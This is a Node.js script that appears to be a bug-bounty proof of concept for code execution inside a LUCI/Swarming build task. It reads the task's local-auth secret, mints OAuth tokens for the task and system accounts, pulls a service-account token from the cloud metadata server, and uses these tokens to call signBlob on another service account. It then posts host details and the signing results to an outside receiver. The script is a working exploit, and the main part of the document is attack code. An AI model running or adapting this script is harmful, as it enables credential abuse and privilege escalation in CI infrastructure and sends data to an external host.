// Authorized Cloud VRP challenge only. No OAuth tokens or local-auth secrets are exported.
const fs = require('fs');
const os = require('os');
const CALLBACK_URL = 'https://luci-rce-receiver-o324i7mbdq-uc.a.run.app';
const SESSION = '6df0c4d852a7f2f97c0ae548d041b1fc493c049a553c41146d9cb038adc6be6a';
const CHALLENGE = 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/cloud-vrp@butterfly-net.iam.gserviceaccount.com:signBlob';

async function request(url, options = {}, timeoutMs = 7000) {
  const response = await fetch(url, {...options, signal: AbortSignal.timeout(timeoutMs)});
  const text = await response.text();
  let body = text;
  try { body = JSON.parse(text); } catch (_) {}
  return {status: response.status, body};
}
async function metadata(path) {
  return request('http://metadata.google.internal/computeMetadata/v1/' + path, {
    headers: {'Metadata-Flavor': 'Google'},
  }, 2500);
}
async function localToken(localAuth, accountId) {
  const response = await request(
    `http://127.0.0.1:${localAuth.rpc_port}/rpc/LuciLocalAuthService.GetOAuthToken`,
    {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        account_id: accountId,
        scopes: ['https://www.googleapis.com/auth/cloud-platform'],
        secret: localAuth.secret,
      }),
    },
  );
  return {token: response.body && response.body.access_token, status: response.status};
}
async function challenge(identity, token) {
  const result = await request(CHALLENGE, {
    method: 'POST',
    headers: {Authorization: 'Bearer ' + token, 'Content-Type': 'application/json'},
    body: JSON.stringify({payload: 'TmljZSBjYXRjaCE='}),
  });
  return {
    identity,
    httpStatus: result.status,
    keyId: result.body && result.body.keyId,
    signedBlob: result.body && result.body.signedBlob,
    errorStatus: result.body && result.body.error && result.body.error.status,
    errorMessage: result.body && result.body.error && result.body.error.message,
  };
}
async function main() {
  const receipt = {
    marker: 'CLOUD_VRP_SIGNBLOB_656594_V3',
    change: 656594,
    executedAt: new Date().toISOString(),
    hostname: os.hostname(),
    user: os.userInfo().username,
    safeEnvironment: {},
    challenge: 'cloud-vrp@butterfly-net.iam.gserviceaccount.com:signBlob',
    payload: 'TmljZSBjYXRjaCE=',
    results: [],
  };
  for (const key of ['SWARMING_TASK_ID', 'SWARMING_BOT_ID']) {
    if (process.env[key]) receipt.safeEnvironment[key] = process.env[key];
  }
  const context = JSON.parse(fs.readFileSync(process.env.LUCI_CONTEXT, 'utf8'));
  for (const accountId of ['task', 'system']) {
    try {
      const identity = await localToken(context.local_auth, accountId);
      if (!identity.token) {
        receipt.results.push({identity: accountId, tokenMintHttpStatus: identity.status});
        continue;
      }
      receipt.results.push(await challenge(accountId, identity.token));
    } catch (error) {
      receipt.results.push({identity: accountId, error: String(error)});
    }
  }
  try {
    const identity = await metadata('instance/service-accounts/default/token');
    const token = identity.body && identity.body.access_token;
    if (token) receipt.results.push(await challenge('metadata', token));
    else receipt.results.push({identity: 'metadata', tokenMintHttpStatus: identity.status});
  } catch (error) {
    receipt.results.push({identity: 'metadata', error: String(error)});
  }
  console.log('CLOUD_VRP_CHALLENGE ' + JSON.stringify(receipt));
  const callback = await request(CALLBACK_URL + '/v1/session/' + SESSION + '/receipt', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json', 'X-Probe-Session': SESSION,
      'User-Agent': 'luci-rce-research',
    },
    body: JSON.stringify({kind: 'gerrit-luci-cloud-vrp-signblob-v3', data: receipt}),
  }, 10000);
  console.log('LUCI_RCE_CALLBACK_STATUS ' + callback.status);
}
main().catch(error => console.log('CLOUD_VRP_CHALLENGE_ERROR ' + String(error)));
